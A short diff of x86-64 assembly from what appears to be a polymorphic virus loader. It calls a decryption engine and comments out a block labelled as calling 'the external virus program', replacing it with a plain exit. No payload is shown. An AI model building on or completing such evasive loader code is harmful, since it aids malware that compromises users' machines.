@@ -44,19 +44,25 @@ _start:             ; Global entry point
 	mov rdx, decrypt_engine.decryption_function
 	call polymorphic
 
-	; call the external virus program
-	xor rbp, rbp
-	pop rdi
-	mov rsi, rsp
-	lea rdx, [rsp+rdi+8*8]
-	push rdi
-	call main
+	; ; call the external virus program
+	; xor rbp, rbp
+	; pop rdi
+	; mov rsi, rsp
+	; lea rdx, [rsp+rdi+8*8]
+	; push rdi
+	; call main
 
 
+	; mov eax,4            ; 'write' system call = 4
+	; mov ebx,1            ; file descriptor 1 = STDOUT
+	; mov ecx,hello        ; string to write
+	; mov edx,helloLen     ; length of string to write
+	; int 80h              ; call the kernel
 
-	mov rdi, rax
-	mov eax, 1
-	int 80h
+	; Terminate program
+	mov eax,1            ; 'exit' system call
+	mov ebx,0            ; exit with error code 0
+	int 80h              ; call the kernel
 
 
 ; decrypt:
